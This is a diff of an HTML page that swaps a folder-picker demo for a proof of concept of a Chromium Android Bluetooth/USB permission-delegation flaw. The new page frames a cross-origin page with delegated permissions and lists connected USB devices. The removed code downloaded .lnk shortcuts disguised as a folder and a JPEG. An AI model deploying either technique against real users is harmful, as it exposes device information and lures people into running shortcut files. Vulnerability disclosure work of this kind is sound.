@@ -1,49 +1,30 @@
 <!doctype html>
-<html lang="en">
-
+<html>
 <head>
-<meta charset="utf-8">
-<title>WebKit Directory Example</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+html { font-family: sans-serif; }
+iframe { width: 90%; height: 300px; }
+</style>
 </head>
-
 <body>
-
-<h3>Directory selection using webkitdirectory</h3>
-
-<input type="file" id="dirInput" webkitdirectory multiple>
-
+<h1>PoC: Bluetooth or USB dialog, incorrect permission delegation behavior (Android)</h1>
+<p>iframe below is cross-origin and delegates permissions via allow="bluetooth;usb"</p>
+<p>Scenarios: <a href="?bt">Bluetooth PoC</a>, <a href="?usb">USB PoC</a></p>
+<p id="usbOutput"></p>
+<iframe id="testFrame" allow="bluetooth;usb"></iframe>
 <script>
-
-const input = document.getElementById("dirInput");
-
-input.addEventListener("change", async (event) => {
-
-    const files = event.target.files;
-
-    console.log("Selected files:");
-
-    for (const file of files) {
-        console.log(file.webkitRelativePath);
-    }
-
-    // Example: trigger downloads instead of writing directly
-    const lnk1 = await fetch("folder.lnk").then(r => r.blob());
-    const lnk2 = await fetch("lnkextra.lnk").then(r => r.blob());
-
-    downloadFile(lnk1, "New folder.lnk");
-    downloadFile(lnk2, "Image.jpg.lnk");
-
-});
-
-function downloadFile(blob, name) {
-    const a = document.createElement("a");
-    a.href = URL.createObjectURL(blob);
-    a.download = name;
-    a.click();
+testFrame.src = 'https://aogarantiza.com/chromium/bt-usb-frame.html?' + window.location.search;
+if (window.location.search.indexOf('usb') > -1) {
+  setInterval(() => {
+    navigator.usb.getDevices().then((devices) => {
+      usbOutput.innerText = '';
+      devices.forEach((device) => {
+        usbOutput.innerText = usbOutput.innerText + device.productId + ', ' + device.vendorId + ', ' + device.productName + "\n";
+      });
+    });
+  }, 3000);
 }
-
 </script>
-
 </body>
 </html>
